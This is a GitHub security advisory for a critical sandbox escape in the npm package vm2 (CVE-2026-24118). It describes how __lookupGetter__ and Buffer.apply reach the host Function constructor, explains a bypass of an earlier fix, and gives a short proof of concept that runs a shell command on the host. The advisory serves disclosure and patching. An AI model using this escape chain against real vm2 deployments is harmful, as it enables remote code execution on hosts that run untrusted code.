# [C] VM2 Sandbox Breakout Through __lookupGetter__

## Summary
Severity: Critical
Advisory: GHSA-grj5-jjm8-h35p
CVE: CVE-2026-24118
CWE: CWE-693, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-grj5-jjm8-h35p
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
### Summary

VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

### Details

The `__lookupGetter__` method allows to read the getter of an object. It is special in VM2 since it will switch between the host and sandbox version of the method when passed to the other context.
This allows to access getters on an object in the host context if the method is called from the host context which can be achieved by using the host `apply` method which can be accessed through `Buffer.apply`.
Afterwards, this function can be used to call the host version of `__lookupGetter__` with `Buffer` and `__proto__` resulting in the prototype lookup method from the host context.
With this method the hosts `Function.prototype` object can be retrieved and the host `Function` acquired through the `constructor` property which allows to create and run code in the host context.
This issue was attempted to be fixed with https://github.com/patriksimek/vm2/blob/4b009c2d4b1131c01810c1205e641d614c322a29/lib/bridge.js#L427. However, this can be circumvented by using `Object.getOwnPropertyDescriptor` to get the `constructor` property.

### PoC

The following code demonstrates this issue by acquiring the host process object and executing `touch pwned`.

```js
const {VM} = require("vm2");
const vm = new VM();
vm.run(`
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
Object.getOwnPropertyDescriptor(p.call(a),'constructor').value('return process')().mainModule.require('child_process').execSync('touch pwned');
`);
```

### Impact

Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-grj5-jjm8-h35p
- https://nvd.nist.gov/vuln/detail/CVE-2026-24118
- https://github.com/patriksimek/vm2/commit/2b5f3e3a060d9088f5e1cdd585d683d491f990a3
- https://github.com/patriksimek/vm2/commit/f9b700b1c7d9ef2df416666cb24e0b659140cc74
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
